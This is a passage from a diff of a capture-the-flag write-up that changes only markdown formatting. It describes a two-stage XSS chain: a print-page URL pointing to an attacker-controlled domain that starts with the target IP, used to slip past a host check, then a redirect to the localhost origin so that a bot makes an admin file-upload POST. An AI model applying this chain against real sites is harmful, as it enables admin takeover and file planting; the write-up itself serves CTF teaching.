@@ -235,24 +235,20 @@ It took us quite a while to find the pretty simple way to bypass this.
 
 We are gonna use two XSS stages.
 
-1. **Make bot visit stage 1 on our server**
-
-   `http://10.13.37.13/index.php?page=print&url=(base64 http://10.13.37.13.f0rki.at/stage1.html)`
-
+1. **Make bot visit stage 1 on our server**  
+   `http://10.13.37.13/index.php?page=print&url=(base64 http://10.13.37.13.f0rki.at/stage1.html)`  
    this passes the check in `admin.php` because the host is 10.13.37.13.
 
 2. **Stage 1 html redirects to `127.0.0.1` origin, which loads stage 2 XSS
-   payload**, we used javascript to set `window.location` to
-
-   `http://127.0.0.1/index.php?page=print&url=(base64 http://10.13.37.13.f0rki.at/stage2.html )`
-
+   payload**, we used javascript to set `window.location` to  
+   `http://127.0.0.1/index.php?page=print&url=(base64 http://10.13.37.13.f0rki.at/stage2.html )`  
    this way we change the origin back to `127.0.0.1`, can execute JS in the context of the bot and are able to perfrom `POST` requests without violating the same-origin policy and bypassing the admin check.
 
 3. **Stage 2 payload makes an ajax `POST` request** to  
     `http://127.0.0.1/admin.php?page=upload`  
     and uploads a file.
 
-    But the file upload code disallowed certain file extensions:  
+    But the file upload code disallowed certain file extensions:
 ```php
 <?php
 [...]
